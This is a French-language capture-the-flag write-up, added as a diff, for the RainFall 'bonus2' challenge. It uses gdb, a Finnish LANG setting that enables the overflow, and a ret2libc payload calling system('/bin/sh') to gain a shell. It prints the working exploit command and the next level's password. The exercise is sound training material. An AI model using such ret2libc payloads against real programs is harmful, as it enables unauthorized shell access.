@@ -1,0 +1,87 @@
+
+Le bonus 2 prend en parametre 2 arguments.
+Si ce n'est pas respecte le programme s'arrete.
+Il y a 2 fonctions :
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+...
+0x08048484  greetuser
+0x08048529  main
+...
+
+Lors de l'excution avec 2 arguments valide le retour affiche "Hello + argv[1]"
+
+On essaye de le faire segfault, mais on a pas le controle d'EIP.
+Dans l'assembleur on decouvre que getenv charge la variable de la langue.
+
+0x0804859f <+118>:	movl   $0x8048738,(%esp)
+0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
+
+x/s 0x8048738 
+0x8048738:	 "LANG"
+
+Un check est fait sur fi qui est la langue finlandaise :
+
+0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)
+0x080485cc <+163>:	mov    0x9c(%esp),%eax
+0x080485d3 <+170>:	mov    %eax,(%esp)
+0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
+
+x/s 0x804873d
+0x804873d:	 "fi"
+
+On change donc la varible d'envionnement pour voir ce qu'il se passe.
+
+LANG=fi_FI.UTF-8
+
+On relance avec les memes arguments qu'avant et avec un generateur de pattern overflow
+on a le controle de l'EIP avec le 2eme buffer qui vaut 22.
+
+./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "CCCC"')
+
+EIP vaut bien 434343
+[ 8350.553542] bonus2[6048]: segfault at 43434343 ip 43434343 sp bffff660 error 14
+
+On cherche a avoir acces a un shell, voyons si la chaine "/bin/sh" existe :
+
+(gdb) info proc map
+process 6144
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fdb000 0xb7fdd000     0x2000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+(gdb) x/s 0xb7f8cc58
+0xb7f8cc58:	 "/bin/sh"
+(gdb) 
+
+C'est le cas. Il nous manque l'adresse de system :
+
+gdb) p &system
+$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
+
+On va envoyer les arguments suivant :
+
+./bonus2 [BUFFER 1 de 40] [BUFFER 2 : PADDING 18 + ADRESSE SYSTEM + PADDING 4 + ADRESSE /bin/sh]
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x60\xb0\xe6\xb7" +"AAAA"+ "\x58\xcc\xf8\xb7"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`��AAAAX���
+$ cat /home/user/bonus3/.pass 
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
